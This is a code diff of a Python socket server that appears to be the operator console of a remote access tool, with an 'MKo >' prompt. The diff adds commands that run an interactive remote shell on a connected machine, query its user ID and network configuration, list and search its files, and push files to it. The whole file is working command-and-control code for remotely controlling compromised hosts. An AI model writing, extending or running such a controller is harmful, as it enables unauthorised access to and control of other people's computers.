@@ -1,14 +1,20 @@
+import lib
 import socket
 import threading
 import os
 
+
 def handle_client(conn, addr):
     print(f"[+] Connexion établie avec {addr[0]}:{addr[1]}")
-    conn.send(b"Bonjour, bienvenue sur le serveur !")
+    conn.send(b"Welcome, you are now connected !")
     while True:
         command = input("MKo > ")
         if command == "exit":
             break
+
+        if command == "help" or command == "?":
+            lib.print_help()
+            continue
 
         if command.startswith("upload"):
             file_path = command.split(" ")[1]
@@ -29,15 +35,59 @@ def handle_client(conn, addr):
 
             print("File uploaded successfully")
 
-        else:
+        if command == "shell":
+            conn.send(command.encode('utf-8'))
+            while True:
+                command = input("MKo (shell) > ")
+                if command == "exit":
+                    conn.send(command.encode('utf-8'))
+                    break
+
+                conn.send(command.encode('utf-8'))
+                output = conn.recv(4096).decode('utf-8')
+                print(output)
+
+        if command == "getuid":
+            conn.send(command.encode('utf-8'))
+            output = conn.recv(1024).decode('utf-8')
+            print(output)
+
+        if command == "ipconfig":
             conn.send(command.encode('utf-8'))
             output = conn.recv(4096).decode('utf-8')
             print(output)
 
+        if command == "ls":
+            conn.send(command.encode('utf-8'))
+            output = conn.recv(4096).decode('utf-8')
+            print(output)
+
+        if command == "pwd":
+            conn.send(command.encode('utf-8'))
+            output = conn.recv(1024).decode('utf-8')
+            print(output)
+
+        if command.lower().startswith("search"):
+            conn.send(command.encode('utf-8'))
+            output = conn.recv(4096).decode('utf-8')
+            print(output)
+
+        if command == "":
+            print("help or ? to display help")
+            print("you can also use ? <command> to get help on a specific command")
+            print("\n")
+            continue
+
+        # else:
+        #     conn.send(command.encode('utf-8'))
+        #     output = conn.recv(4096).decode('utf-8')
+        #     print(output)
+
     conn.close()
 
+
 host = '0.0.0.0'
-port = 12345
+port = 1234
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind((host, port))
